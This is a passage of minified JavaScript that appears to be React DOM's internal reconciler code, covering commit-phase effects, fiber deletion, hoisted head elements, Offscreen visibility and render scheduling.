              Z(n, n.return, e);
            }
          }
          break;
        case 27:
          t === null && r & 4 && Qc(n);
        case 26:
        case 5:
          (bl(e, n), t === null && r & 4 && Kc(n), r & 512 && Wc(n, n.return));
          break;
        case 12:
          bl(e, n);
          break;
        case 31:
          (bl(e, n), r & 4 && dl(e, n));
          break;
        case 13:
          (bl(e, n),
            r & 4 && fl(e, n),
            r & 64 &&
              ((e = n.memoizedState),
              e !== null &&
                ((e = e.dehydrated),
                e !== null && ((n = Ju.bind(null, n)), sf(e, n)))));
          break;
        case 22:
          if (((r = n.memoizedState !== null || $c), !r)) {
            ((t = (t !== null && t.memoizedState !== null) || el), (i = $c));
            var a = el;
            (($c = r),
              (el = t) && !a
                ? Sl(e, n, (n.subtreeFlags & 8772) != 0)
                : bl(e, n),
              ($c = i),
              (el = a));
          }
          break;
        case 30:
          break;
        default:
          bl(e, n);
      }
    }
    function ol(e) {
      var t = e.alternate;
      (t !== null && ((e.alternate = null), ol(t)),
        (e.child = null),
        (e.deletions = null),
        (e.sibling = null),
        e.tag === 5 && ((t = e.stateNode), t !== null && yt(t)),
        (e.stateNode = null),
        (e.return = null),
        (e.dependencies = null),
        (e.memoizedProps = null),
        (e.memoizedState = null),
        (e.pendingProps = null),
        (e.stateNode = null),
        (e.updateQueue = null));
    }
    var sl = null,
      cl = !1;
    function ll(e, t, n) {
      for (n = n.child; n !== null; ) (ul(e, t, n), (n = n.sibling));
    }
    function ul(e, t, n) {
      if (Be && typeof Be.onCommitFiberUnmount == `function`)
        try {
          Be.onCommitFiberUnmount(ze, n);
        } catch {}
      switch (n.tag) {
        case 26:
          (el || Gc(n, t),
            ll(e, t, n),
            n.memoizedState
              ? n.memoizedState.count--
              : n.stateNode &&
                ((n = n.stateNode), n.parentNode.removeChild(n)));
          break;
        case 27:
          el || Gc(n, t);
          var r = sl,
            i = cl;
          (Zd(n.type) && ((sl = n.stateNode), (cl = !1)),
            ll(e, t, n),
            pf(n.stateNode),
            (sl = r),
            (cl = i));
          break;
        case 5:
          el || Gc(n, t);
        case 6:
          if (
            ((r = sl),
            (i = cl),
            (sl = null),
            ll(e, t, n),
            (sl = r),
            (cl = i),
            sl !== null)
          )
            if (cl)
              try {
                (sl.nodeType === 9
                  ? sl.body
                  : sl.nodeName === `HTML`
                    ? sl.ownerDocument.body
                    : sl
                ).removeChild(n.stateNode);
              } catch (e) {
                Z(n, t, e);
              }
            else
              try {
                sl.removeChild(n.stateNode);
              } catch (e) {
                Z(n, t, e);
              }
          break;
        case 18:
          sl !== null &&
            (cl
              ? ((e = sl),
                Qd(
                  e.nodeType === 9
                    ? e.body
                    : e.nodeName === `HTML`
                      ? e.ownerDocument.body
                      : e,
                  n.stateNode,
                ),
                Np(e))
              : Qd(sl, n.stateNode));
          break;
        case 4:
          ((r = sl),
            (i = cl),
            (sl = n.stateNode.containerInfo),
            (cl = !0),
            ll(e, t, n),
            (sl = r),
            (cl = i));
          break;
        case 0:
        case 11:
        case 14:
        case 15:
          (Vc(2, n, t), el || Vc(4, n, t), ll(e, t, n));
          break;
        case 1:
          (el ||
            (Gc(n, t),
            (r = n.stateNode),
            typeof r.componentWillUnmount == `function` && Uc(n, t, r)),
            ll(e, t, n));
          break;
        case 21:
          ll(e, t, n);
          break;
        case 22:
          ((el = (r = el) || n.memoizedState !== null), ll(e, t, n), (el = r));
          break;
        default:
          ll(e, t, n);
      }
    }
    function dl(e, t) {
      if (
        t.memoizedState === null &&
        ((e = t.alternate), e !== null && ((e = e.memoizedState), e !== null))
      ) {
        e = e.dehydrated;
        try {
          Np(e);
        } catch (e) {
          Z(t, t.return, e);
        }
      }
    }
    function fl(e, t) {
      if (
        t.memoizedState === null &&
        ((e = t.alternate),
        e !== null &&
          ((e = e.memoizedState),
          e !== null && ((e = e.dehydrated), e !== null)))
      )
        try {
          Np(e);
        } catch (e) {
          Z(t, t.return, e);
        }
    }
    function pl(e) {
      switch (e.tag) {
        case 31:
        case 13:
        case 19:
          var t = e.stateNode;
          return (t === null && (t = e.stateNode = new nl()), t);
        case 22:
          return (
            (e = e.stateNode),
            (t = e._retryCache),
            t === null && (t = e._retryCache = new nl()),
            t
          );
        default:
          throw Error(i(435, e.tag));
      }
    }
    function ml(e, t) {
      var n = pl(e);
      t.forEach(function (t) {
        if (!n.has(t)) {
          n.add(t);
          var r = Yu.bind(null, e, t);
          t.then(r, r);
        }
      });
    }
    function hl(e, t) {
      var n = t.deletions;
      if (n !== null)
        for (var r = 0; r < n.length; r++) {
          var a = n[r],
            o = e,
            s = t,
            c = s;
          a: for (; c !== null; ) {
            switch (c.tag) {
              case 27:
                if (Zd(c.type)) {
                  ((sl = c.stateNode), (cl = !1));
                  break a;
                }
                break;
              case 5:
                ((sl = c.stateNode), (cl = !1));
                break a;
              case 3:
              case 4:
                ((sl = c.stateNode.containerInfo), (cl = !0));
                break a;
            }
            c = c.return;
          }
          if (sl === null) throw Error(i(160));
          (ul(o, s, a),
            (sl = null),
            (cl = !1),
            (o = a.alternate),
            o !== null && (o.return = null),
            (a.return = null));
        }
      if (t.subtreeFlags & 13886)
        for (t = t.child; t !== null; ) (_l(t, e), (t = t.sibling));
    }
    var gl = null;
    function _l(e, t) {
      var n = e.alternate,
        r = e.flags;
      switch (e.tag) {
        case 0:
        case 11:
        case 14:
        case 15:
          (hl(t, e),
            vl(e),
            r & 4 && (Vc(3, e, e.return), Bc(3, e), Vc(5, e, e.return)));
          break;
        case 1:
          (hl(t, e),
            vl(e),
            r & 512 && (el || n === null || Gc(n, n.return)),
            r & 64 &&
              $c &&
              ((e = e.updateQueue),
              e !== null &&
                ((r = e.callbacks),
                r !== null &&
                  ((n = e.shared.hiddenCallbacks),
                  (e.shared.hiddenCallbacks = n === null ? r : n.concat(r))))));
          break;
        case 26:
          var a = gl;
          if (
            (hl(t, e),
            vl(e),
            r & 512 && (el || n === null || Gc(n, n.return)),
            r & 4)
          ) {
            var o = n === null ? null : n.memoizedState;
            if (((r = e.memoizedState), n === null))
              if (r === null)
                if (e.stateNode === null) {
                  a: {
                    ((r = e.type),
                      (n = e.memoizedProps),
                      (a = a.ownerDocument || a));
                    b: switch (r) {
                      case `title`:
                        ((o = a.getElementsByTagName(`title`)[0]),
                          (!o ||
                            o[vt] ||
                            o[dt] ||
                            o.namespaceURI === `http://www.w3.org/2000/svg` ||
                            o.hasAttribute(`itemprop`)) &&
                            ((o = a.createElement(r)),
                            a.head.insertBefore(
                              o,
                              a.querySelector(`head > title`),
                            )),
                          Pd(o, r, n),
                          (o[dt] = e),
                          wt(o),
                          (r = o));
                        break a;
                      case `link`:
                        var s = Vf(`link`, `href`, a).get(r + (n.href || ``));
                        if (s) {
                          for (var c = 0; c < s.length; c++)
                            if (
                              ((o = s[c]),
                              o.getAttribute(`href`) ===
                                (n.href == null || n.href === ``
                                  ? null
                                  : n.href) &&
                                o.getAttribute(`rel`) ===
                                  (n.rel == null ? null : n.rel) &&
                                o.getAttribute(`title`) ===
                                  (n.title == null ? null : n.title) &&
                                o.getAttribute(`crossorigin`) ===
                                  (n.crossOrigin == null
                                    ? null
                                    : n.crossOrigin))
                            ) {
                              s.splice(c, 1);
                              break b;
                            }
                        }
                        ((o = a.createElement(r)),
                          Pd(o, r, n),
                          a.head.appendChild(o));
                        break;
                      case `meta`:
                        if (
                          (s = Vf(`meta`, `content`, a).get(
                            r + (n.content || ``),
                          ))
                        ) {
                          for (c = 0; c < s.length; c++)
                            if (
                              ((o = s[c]),
                              o.getAttribute(`content`) ===
                                (n.content == null ? null : `` + n.content) &&
                                o.getAttribute(`name`) ===
                                  (n.name == null ? null : n.name) &&
                                o.getAttribute(`property`) ===
                                  (n.property == null ? null : n.property) &&
                                o.getAttribute(`http-equiv`) ===
                                  (n.httpEquiv == null ? null : n.httpEquiv) &&
                                o.getAttribute(`charset`) ===
                                  (n.charSet == null ? null : n.charSet))
                            ) {
                              s.splice(c, 1);
                              break b;
                            }
                        }
                        ((o = a.createElement(r)),
                          Pd(o, r, n),
                          a.head.appendChild(o));
                        break;
                      default:
                        throw Error(i(468, r));
                    }
                    ((o[dt] = e), wt(o), (r = o));
                  }
                  e.stateNode = r;
                } else Hf(a, e.type, e.stateNode);
              else e.stateNode = If(a, r, e.memoizedProps);
            else
              o === r
                ? r === null &&
                  e.stateNode !== null &&
                  qc(e, e.memoizedProps, n.memoizedProps)
                : (o === null
                    ? n.stateNode !== null &&
                      ((n = n.stateNode), n.parentNode.removeChild(n))
                    : o.count--,
                  r === null
                    ? Hf(a, e.type, e.stateNode)
                    : If(a, r, e.memoizedProps));
          }
          break;
        case 27:
          (hl(t, e),
            vl(e),
            r & 512 && (el || n === null || Gc(n, n.return)),
            n !== null && r & 4 && qc(e, e.memoizedProps, n.memoizedProps));
          break;
        case 5:
          if (
            (hl(t, e),
            vl(e),
            r & 512 && (el || n === null || Gc(n, n.return)),
            e.flags & 32)
          ) {
            a = e.stateNode;
            try {
              Xt(a, ``);
            } catch (t) {
              Z(e, e.return, t);
            }
          }
          (r & 4 &&
            e.stateNode != null &&
            ((a = e.memoizedProps), qc(e, a, n === null ? a : n.memoizedProps)),
            r & 1024 && (tl = !0));
          break;
        case 6:
          if ((hl(t, e), vl(e), r & 4)) {
            if (e.stateNode === null) throw Error(i(162));
            ((r = e.memoizedProps), (n = e.stateNode));
            try {
              n.nodeValue = r;
            } catch (t) {
              Z(e, e.return, t);
            }
          }
          break;
        case 3:
          if (
            ((Bf = null),
            (a = gl),
            (gl = gf(t.containerInfo)),
            hl(t, e),
            (gl = a),
            vl(e),
            r & 4 && n !== null && n.memoizedState.isDehydrated)
          )
            try {
              Np(t.containerInfo);
            } catch (t) {
              Z(e, e.return, t);
            }
          tl && ((tl = !1), yl(e));
          break;
        case 4:
          ((r = gl),
            (gl = gf(e.stateNode.containerInfo)),
            hl(t, e),
            vl(e),
            (gl = r));
          break;
        case 12:
          (hl(t, e), vl(e));
          break;
        case 31:
          (hl(t, e),
            vl(e),
            r & 4 &&
              ((r = e.updateQueue),
              r !== null && ((e.updateQueue = null), ml(e, r))));
          break;
        case 13:
          (hl(t, e),
            vl(e),
            e.child.flags & 8192 &&
              (e.memoizedState !== null) !=
                (n !== null && n.memoizedState !== null) &&
              ($l = Ae()),
            r & 4 &&
              ((r = e.updateQueue),
              r !== null && ((e.updateQueue = null), ml(e, r))));
          break;
        case 22:
          a = e.memoizedState !== null;
          var l = n !== null && n.memoizedState !== null,
            u = $c,
            d = el;
          if (
            (($c = u || a),
            (el = d || l),
            hl(t, e),
            (el = d),
            ($c = u),
            vl(e),
            r & 8192)
          )
            a: for (
              t = e.stateNode,
                t._visibility = a ? t._visibility & -2 : t._visibility | 1,
                a && (n === null || l || $c || el || xl(e)),
                n = null,
                t = e;
              ;
            ) {
              if (t.tag === 5 || t.tag === 26) {
                if (n === null) {
                  l = n = t;
                  try {
                    if (((o = l.stateNode), a))
                      ((s = o.style),
                        typeof s.setProperty == `function`
                          ? s.setProperty(`display`, `none`, `important`)
                          : (s.display = `none`));
                    else {
                      c = l.stateNode;
                      var f = l.memoizedProps.style,
                        p =
                          f != null && f.hasOwnProperty(`display`)
                            ? f.display
                            : null;
                      c.style.display =
                        p == null || typeof p == `boolean`
                          ? ``
                          : (`` + p).trim();
                    }
                  } catch (e) {
                    Z(l, l.return, e);
                  }
                }
              } else if (t.tag === 6) {
                if (n === null) {
                  l = t;
                  try {
                    l.stateNode.nodeValue = a ? `` : l.memoizedProps;
                  } catch (e) {
                    Z(l, l.return, e);
                  }
                }
              } else if (t.tag === 18) {
                if (n === null) {
                  l = t;
                  try {
                    var m = l.stateNode;
                    a ? $d(m, !0) : $d(l.stateNode, !1);
                  } catch (e) {
                    Z(l, l.return, e);
                  }
                }
              } else if (
                ((t.tag !== 22 && t.tag !== 23) ||
                  t.memoizedState === null ||
                  t === e) &&
                t.child !== null
              ) {
                ((t.child.return = t), (t = t.child));
                continue;
              }
              if (t === e) break a;
              for (; t.sibling === null; ) {
                if (t.return === null || t.return === e) break a;
                (n === t && (n = null), (t = t.return));
              }
              (n === t && (n = null),
                (t.sibling.return = t.return),
                (t = t.sibling));
            }
          r & 4 &&
            ((r = e.updateQueue),
            r !== null &&
              ((n = r.retryQueue),
              n !== null && ((r.retryQueue = null), ml(e, n))));
          break;
        case 19:
          (hl(t, e),
            vl(e),
            r & 4 &&
              ((r = e.updateQueue),
              r !== null && ((e.updateQueue = null), ml(e, r))));
          break;
        case 30:
          break;
        case 21:
          break;
        default:
          (hl(t, e), vl(e));
      }
    }
    function vl(e) {
      var t = e.flags;
      if (t & 2) {
        try {
          for (var n, r = e.return; r !== null; ) {
            if (Jc(r)) {
              n = r;
              break;
            }
            r = r.return;
          }
          if (n == null) throw Error(i(160));
          switch (n.tag) {
            case 27:
              var a = n.stateNode;
              Zc(e, Yc(e), a);
              break;
            case 5:
              var o = n.stateNode;
              (n.flags & 32 && (Xt(o, ``), (n.flags &= -33)), Zc(e, Yc(e), o));
              break;
            case 3:
            case 4:
              var s = n.stateNode.containerInfo;
              Xc(e, Yc(e), s);
              break;
            default:
              throw Error(i(161));
          }
        } catch (t) {
          Z(e, e.return, t);
        }
        e.flags &= -3;
      }
      t & 4096 && (e.flags &= -4097);
    }
    function yl(e) {
      if (e.subtreeFlags & 1024)
        for (e = e.child; e !== null; ) {
          var t = e;
          (yl(t),
            t.tag === 5 && t.flags & 1024 && t.stateNode.reset(),
            (e = e.sibling));
        }
    }
    function bl(e, t) {
      if (t.subtreeFlags & 8772)
        for (t = t.child; t !== null; )
          (al(e, t.alternate, t), (t = t.sibling));
    }
    function xl(e) {
      for (e = e.child; e !== null; ) {
        var t = e;
        switch (t.tag) {
          case 0:
          case 11:
          case 14:
          case 15:
            (Vc(4, t, t.return), xl(t));
            break;
          case 1:
            Gc(t, t.return);
            var n = t.stateNode;
            (typeof n.componentWillUnmount == `function` && Uc(t, t.return, n),
              xl(t));
            break;
          case 27:
            pf(t.stateNode);
          case 26:
          case 5:
            (Gc(t, t.return), xl(t));
            break;
          case 22:
            t.memoizedState === null && xl(t);
            break;
          case 30:
            xl(t);
            break;
          default:
            xl(t);
        }
        e = e.sibling;
      }
    }
    function Sl(e, t, n) {
      for (n &&= (t.subtreeFlags & 8772) != 0, t = t.child; t !== null; ) {
        var r = t.alternate,
          i = e,
          a = t,
          o = a.flags;
        switch (a.tag) {
          case 0:
          case 11:
          case 15:
            (Sl(i, a, n), Bc(4, a));
            break;
          case 1:
            if (
              (Sl(i, a, n),
              (r = a),
              (i = r.stateNode),
              typeof i.componentDidMount == `function`)
            )
              try {
                i.componentDidMount();
              } catch (e) {
                Z(r, r.return, e);
              }
            if (((r = a), (i = r.updateQueue), i !== null)) {
              var s = r.stateNode;
              try {
                var c = i.shared.hiddenCallbacks;
                if (c !== null)
                  for (
                    i.shared.hiddenCallbacks = null, i = 0;
                    i < c.length;
                    i++
                  )
                    qa(c[i], s);
              } catch (e) {
                Z(r, r.return, e);
              }
            }
            (n && o & 64 && Hc(a), Wc(a, a.return));
            break;
          case 27:
            Qc(a);
          case 26:
          case 5:
            (Sl(i, a, n), n && r === null && o & 4 && Kc(a), Wc(a, a.return));
            break;
          case 12:
            Sl(i, a, n);
            break;
          case 31:
            (Sl(i, a, n), n && o & 4 && dl(i, a));
            break;
          case 13:
            (Sl(i, a, n), n && o & 4 && fl(i, a));
            break;
          case 22:
            (a.memoizedState === null && Sl(i, a, n), Wc(a, a.return));
            break;
          case 30:
            break;
          default:
            Sl(i, a, n);
        }
        t = t.sibling;
      }
    }
    function Cl(e, t) {
      var n = null;
      (e !== null &&
        e.memoizedState !== null &&
        e.memoizedState.cachePool !== null &&
        (n = e.memoizedState.cachePool.pool),
        (e = null),
        t.memoizedState !== null &&
          t.memoizedState.cachePool !== null &&
          (e = t.memoizedState.cachePool.pool),
        e !== n && (e != null && e.refCount++, n != null && ca(n)));
    }
    function wl(e, t) {
      ((e = null),
        t.alternate !== null && (e = t.alternate.memoizedState.cache),
        (t = t.memoizedState.cache),
        t !== e && (t.refCount++, e != null && ca(e)));
    }
    function Tl(e, t, n, r) {
      if (t.subtreeFlags & 10256)
        for (t = t.child; t !== null; ) (El(e, t, n, r), (t = t.sibling));
    }
    function El(e, t, n, r) {
      var i = t.flags;
      switch (t.tag) {
        case 0:
        case 11:
        case 15:
          (Tl(e, t, n, r), i & 2048 && Bc(9, t));
          break;
        case 1:
          Tl(e, t, n, r);
          break;
        case 3:
          (Tl(e, t, n, r),
            i & 2048 &&
              ((e = null),
              t.alternate !== null && (e = t.alternate.memoizedState.cache),
              (t = t.memoizedState.cache),
              t !== e && (t.refCount++, e != null && ca(e))));
          break;
        case 12:
          if (i & 2048) {
            (Tl(e, t, n, r), (e = t.stateNode));
            try {
              var a = t.memoizedProps,
                o = a.id,
                s = a.onPostCommit;
              typeof s == `function` &&
                s(
                  o,
                  t.alternate === null ? `mount` : `update`,
                  e.passiveEffectDuration,
                  -0,
                );
            } catch (e) {
              Z(t, t.return, e);
            }
          } else Tl(e, t, n, r);
          break;
        case 31:
          Tl(e, t, n, r);
          break;
        case 13:
          Tl(e, t, n, r);
          break;
        case 23:
          break;
        case 22:
          ((a = t.stateNode),
            (o = t.alternate),
            t.memoizedState === null
              ? a._visibility & 2
                ? Tl(e, t, n, r)
                : ((a._visibility |= 2),
                  Dl(e, t, n, r, (t.subtreeFlags & 10256) != 0 || !1))
              : a._visibility & 2
                ? Tl(e, t, n, r)
                : Ol(e, t),
            i & 2048 && Cl(o, t));
          break;
        case 24:
          (Tl(e, t, n, r), i & 2048 && wl(t.alternate, t));
          break;
        default:
          Tl(e, t, n, r);
      }
    }
    function Dl(e, t, n, r, i) {
      for (
        i &&= (t.subtreeFlags & 10256) != 0 || !1, t = t.child;
        t !== null;
      ) {
        var a = e,
          o = t,
          s = n,
          c = r,
          l = o.flags;
        switch (o.tag) {
          case 0:
          case 11:
          case 15:
            (Dl(a, o, s, c, i), Bc(8, o));
            break;
          case 23:
            break;
          case 22:
            var u = o.stateNode;
            (o.memoizedState === null
              ? ((u._visibility |= 2), Dl(a, o, s, c, i))
              : u._visibility & 2
                ? Dl(a, o, s, c, i)
                : Ol(a, o),
              i && l & 2048 && Cl(o.alternate, o));
            break;
          case 24:
            (Dl(a, o, s, c, i), i && l & 2048 && wl(o.alternate, o));
            break;
          default:
            Dl(a, o, s, c, i);
        }
        t = t.sibling;
      }
    }
    function Ol(e, t) {
      if (t.subtreeFlags & 10256)
        for (t = t.child; t !== null; ) {
          var n = e,
            r = t,
            i = r.flags;
          switch (r.tag) {
            case 22:
              (Ol(n, r), i & 2048 && Cl(r.alternate, r));
              break;
            case 24:
              (Ol(n, r), i & 2048 && wl(r.alternate, r));
              break;
            default:
              Ol(n, r);
          }
          t = t.sibling;
        }
    }
    var kl = 8192;
    function Al(e, t, n) {
      if (e.subtreeFlags & kl)
        for (e = e.child; e !== null; ) (jl(e, t, n), (e = e.sibling));
    }
    function jl(e, t, n) {
      switch (e.tag) {
        case 26:
          (Al(e, t, n),
            e.flags & kl &&
              e.memoizedState !== null &&
              Gf(n, gl, e.memoizedState, e.memoizedProps));
          break;
        case 5:
          Al(e, t, n);
          break;
        case 3:
        case 4:
          var r = gl;
          ((gl = gf(e.stateNode.containerInfo)), Al(e, t, n), (gl = r));
          break;
        case 22:
          e.memoizedState === null &&
            ((r = e.alternate),
            r !== null && r.memoizedState !== null
              ? ((r = kl), (kl = 16777216), Al(e, t, n), (kl = r))
              : Al(e, t, n));
          break;
        default:
          Al(e, t, n);
      }
    }
    function Ml(e) {
      var t = e.alternate;
      if (t !== null && ((e = t.child), e !== null)) {
        t.child = null;
        do ((t = e.sibling), (e.sibling = null), (e = t));
        while (e !== null);
      }
    }
    function Nl(e) {
      var t = e.deletions;
      if (e.flags & 16) {
        if (t !== null)
          for (var n = 0; n < t.length; n++) {
            var r = t[n];
            ((rl = r), Il(r, e));
          }
        Ml(e);
      }
      if (e.subtreeFlags & 10256)
        for (e = e.child; e !== null; ) (Pl(e), (e = e.sibling));
    }
    function Pl(e) {
      switch (e.tag) {
        case 0:
        case 11:
        case 15:
          (Nl(e), e.flags & 2048 && Vc(9, e, e.return));
          break;
        case 3:
          Nl(e);
          break;
        case 12:
          Nl(e);
          break;
        case 22:
          var t = e.stateNode;
          e.memoizedState !== null &&
          t._visibility & 2 &&
          (e.return === null || e.return.tag !== 13)
            ? ((t._visibility &= -3), Fl(e))
            : Nl(e);
          break;
        default:
          Nl(e);
      }
    }
    function Fl(e) {
      var t = e.deletions;
      if (e.flags & 16) {
        if (t !== null)
          for (var n = 0; n < t.length; n++) {
            var r = t[n];
            ((rl = r), Il(r, e));
          }
        Ml(e);
      }
      for (e = e.child; e !== null; ) {
        switch (((t = e), t.tag)) {
          case 0:
          case 11:
          case 15:
            (Vc(8, t, t.return), Fl(t));
            break;
          case 22:
            ((n = t.stateNode),
              n._visibility & 2 && ((n._visibility &= -3), Fl(t)));
            break;
          default:
            Fl(t);
        }
        e = e.sibling;
      }
    }
    function Il(e, t) {
      for (; rl !== null; ) {
        var n = rl;
        switch (n.tag) {
          case 0:
          case 11:
          case 15:
            Vc(8, n, t);
            break;
          case 23:
          case 22:
            if (
              n.memoizedState !== null &&
              n.memoizedState.cachePool !== null
            ) {
              var r = n.memoizedState.cachePool.pool;
              r != null && r.refCount++;
            }
            break;
          case 24:
            ca(n.memoizedState.cache);
        }
        if (((r = n.child), r !== null)) ((r.return = n), (rl = r));
        else
          a: for (n = e; rl !== null; ) {
            r = rl;
            var i = r.sibling,
              a = r.return;
            if ((ol(r), r === n)) {
              rl = null;
              break a;
            }
            if (i !== null) {
              ((i.return = a), (rl = i));
              break a;
            }
            rl = a;
          }
      }
    }
    var Ll = {
        getCacheForType: function (e) {
          var t = ta(B),
            n = t.data.get(e);
          return (n === void 0 && ((n = e()), t.data.set(e, n)), n);
        },
        cacheSignal: function () {
          return ta(B).controller.signal;
        },
      },
      Rl = typeof WeakMap == `function` ? WeakMap : Map,
      K = 0,
      q = null,
      J = null,
      Y = 0,
      X = 0,
      zl = null,
      Bl = !1,
      Vl = !1,
      Hl = !1,
      Ul = 0,
      Wl = 0,
      Gl = 0,
      Kl = 0,
      ql = 0,
      Jl = 0,
      Yl = 0,
      Xl = null,
      Zl = null,
      Ql = !1,
      $l = 0,
      eu = 0,
      tu = 1 / 0,
      nu = null,
      ru = null,
      iu = 0,
      au = null,
      ou = null,
      su = 0,
      cu = 0,
      lu = null,
      uu = null,
      du = 0,
      fu = null;
    function pu() {
      return K & 2 && Y !== 0 ? Y & -Y : A.T === null ? ct() : dd();
    }
    function mu() {
      if (Jl === 0)
        if (!(Y & 536870912) || L) {
          var e = qe;
          ((qe <<= 1), !(qe & 3932160) && (qe = 262144), (Jl = e));
        } else Jl = 536870912;
      return ((e = eo.current), e !== null && (e.flags |= 32), Jl);
    }
    function hu(e, t, n) {
      (((e === q && (X === 2 || X === 9)) || e.cancelPendingCommit !== null) &&
        (Su(e, 0), yu(e, Y, Jl, !1)),
        tt(e, n),
        (!(K & 2) || e !== q) &&
          (e === q && (!(K & 2) && (Kl |= n), Wl === 4 && yu(e, Y, Jl, !1)),
          rd(e)));
    }
    function gu(e, t, n) {
      if (K & 6) throw Error(i(327));
      var r = (!n && (t & 127) == 0 && (t & e.expiredLanes) === 0) || Ze(e, t),
        a = r ? Au(e, t) : Ou(e, t, !0),
        o = r;
      do {
        if (a === 0) {
          Vl && !r && yu(e, t, 0, !1);
          break;
        } else {
          if (((n = e.current.alternate), o && !vu(n))) {
            ((a = Ou(e, t, !1)), (o = !1));
            continue;
          }
          if (a === 2) {
            if (((o = t), e.errorRecoveryDisabledLanes & o)) var s = 0;
            else
              ((s = e.pendingLanes & -536870913),
                (s = s === 0 ? (s & 536870912 ? 536870912 : 0) : s));
            if (s !== 0) {
              t = s;
              a: {
                var c = e;
                a = Xl;
                var l = c.current.memoizedState.isDehydrated;
                if (
                  (l && (Su(c, s).flags |= 256), (s = Ou(c, s, !1)), s !== 2)
                ) {
                  if (Hl && !l) {
                    ((c.errorRecoveryDisabledLanes |= o), (Kl |= o), (a = 4));
                    break a;
                  }
                  ((o = Zl),
                    (Zl = a),
                    o !== null &&
                      (Zl === null ? (Zl = o) : Zl.push.apply(Zl, o)));
                }
                a = s;
              }
              if (((o = !1), a !== 2)) continue;
            }
          }
          if (a === 1) {
            (Su(e, 0), yu(e, t, 0, !0));
            break;
          }
          a: {
            switch (((r = e), (o = a), o)) {
              case 0:
              case 1:
                throw Error(i(345));
              case 4:
                if ((t & 4194048) !== t) break;
              case 6:
                yu(r, t, Jl, !Bl);
                break a;
              case 2:
                Zl = null;
                break;
              case 3:
              case 5:
                break;
              default:
                throw Error(i(329));
            }
            if ((t & 62914560) === t && ((a = $l + 300 - Ae()), 10 < a)) {
              if ((yu(r, t, Jl, !Bl), Xe(r, 0, !0) !== 0)) break a;
              ((su = t),
                (r.timeoutHandle = Kd(
                  _u.bind(
                    null,
                    r,
                    n,
                    Zl,
                    nu,
                    Ql,
                    t,
                    Jl,
                    Kl,
                    Yl,
                    Bl,
                    o,
                    `Throttled`,
                    -0,
                    0,
                  ),
                  a,
                )));
              break a;
            }
            _u(r, n, Zl, nu, Ql, t, Jl, Kl, Yl, Bl, o, null, -0, 0);
          }
        }
        break;
      } while (1);
      rd(e);
    }
    function _u(e, t, n, r, i, a, o, s, c, l, u, d, f, p) {
      if (
        ((e.timeoutHandle = -1),
        (d = t.subtreeFlags),
        d & 8192 || (d & 16785408) == 16785408)
      ) {
        ((d = {
          stylesheets: null,
          count: 0,
          imgCount: 0,
          imgBytes: 0,
          suspenseyImages: [],
          waitingForImages: !0,
          waitingForViewTransition: !1,
          unsuspend: an,
        }),
          jl(t, a, d));
        var m =
          (a & 62914560) === a
            ? $l - Ae()
            : (a & 4194048) === a
              ? eu - Ae()
              : 0;
        if (((m = qf(d, m)), m !== null)) {
          ((su = a),
            (e.cancelPendingCommit = m(
              Lu.bind(null, e, t, a, n, r, i, o, s, c, u, d, null, f, p),
            )),
            yu(e, a, o, !l));
          return;
        }
      }
      Lu(e, t, a, n, r, i, o, s, c);
    }
    function vu(e) {
      for (var t = e; ; ) {
        var n = t.tag;
        if (
          (n === 0 || n === 11 || n === 15) &&
          t.flags & 16384 &&
          ((n = t.updateQueue), n !== null && ((n = n.stores), n !== null))
        )
          for (var r = 0; r < n.length; r++) {
            var i = n[r],
              a = i.getSnapshot;
            i = i.value;
            try {
              if (!Tr(a(), i)) return !1;
            } catch {
              return !1;
            }
          }
        if (((n = t.child), t.subtreeFlags & 16384 && n !== null))
          ((n.return = t), (t = n));
        else {
          if (t === e) break;
          for (; t.sibling === null; ) {
            if (t.return === null || t.return === e) return !0;
            t = t.return;
          }
          ((t.sibling.return = t.return), (t = t.sibling));
        }
      }
      return !0;
    }
    function yu(e, t, n, r) {
      ((t &= ~ql),
        (t &= ~Kl),
        (e.suspendedLanes |= t),
        (e.pingedLanes &= ~t),
        r && (e.warmLanes |= t),
        (r = e.expirationTimes));
      for (var i = t; 0 < i; ) {
        var a = 31 - He(i),
          o = 1 << a;
        ((r[a] = -1), (i &= ~o));
      }
      n !== 0 && rt(e, n, t);
    }
    function bu() {
      return K & 6 ? !0 : (id(0, !1), !1);
    }
    function xu() {
      if (J !== null) {
        if (X === 0) var e = J.return;
        else ((e = J), (R = Ji = null), Do(e), (ka = null), (Aa = 0), (e = J));
        for (; e !== null; ) (zc(e.alternate, e), (e = e.return));
        J = null;
      }
    }
    function Su(e, t) {
      var n = e.timeoutHandle;
      (n !== -1 && ((e.timeoutHandle = -1), qd(n)),
        (n = e.cancelPendingCommit),
        n !== null && ((e.cancelPendingCommit = null), n()),
        (su = 0),
        xu(),
        (q = e),
        (J = n = pi(e.current, null)),
        (Y = t),
        (X = 0),
        (zl = null),
        (Bl = !1),
        (Vl = Ze(e, t)),
        (Hl = !1),
        (Yl = Jl = ql = Kl = Gl = Wl = 0),
        (Zl = Xl = null),
        (Ql = !1),
        t & 8 && (t |= t & 32));
      var r = e.entangledLanes;
      if (r !== 0)
        for (e = e.entanglements, r &= t; 0 < r; ) {
          var i = 31 - He(r),
            a = 1 << i;
          ((t |= e[i]), (r &= ~a));
        }
      return ((Ul = t), ri(), n);
    }
    function Cu(e, t) {
      ((U = null),
        (A.H = Ls),
        t === V || t === xa
          ? ((t = Da()), (X = 3))
          : t === H
            ? ((t = Da()), (X = 4))
            : (X =
                t === tc
                  ? 8
                  : typeof t == `object` && t && typeof t.then == `function`
                    ? 6
                    : 1),
        (zl = t),
        J === null && ((Wl = 1), Ys(e, xi(t, e.current))));
    }
    function wu() {
      var e = eo.current;
      return e === null
        ? !0
        : (Y & 4194048) === Y
          ? to === null
          : (Y & 62914560) === Y || Y & 536870912
            ? e === to
            : !1;
    }
    function Tu() {
      var e = A.H;
      return ((A.H = Ls), e === null ? Ls : e);
    }
    function Eu() {
      var e = A.A;
      return ((A.A = Ll), e);
    }
    function Du() {
      ((Wl = 4),
        Bl || ((Y & 4194048) !== Y && eo.current !== null) || (Vl = !0),
        (!(Gl & 134217727) && !(Kl & 134217727)) ||
          q === null ||
          yu(q, Y, Jl, !1));
    }
    function Ou(e, t, n) {
      var r = K;
      K |= 2;
      var i = Tu(),
        a = Eu();
      ((q !== e || Y !== t) && ((nu = null), Su(e, t)), (t = !1));
      var o = Wl;
      a: do
        try {
          if (X !== 0 && J !== null) {
            var s = J,
              c = zl;
            switch (X) {
              case 8:
                (xu(), (o = 6));
                break a;
              case 3:
              case 2:
              case 9:
              case 6:
                eo.current === null && (t = !0);
                var l = X;
                if (((X = 0), (zl = null), Pu(e, s, c, l), n && Vl)) {
                  o = 0;
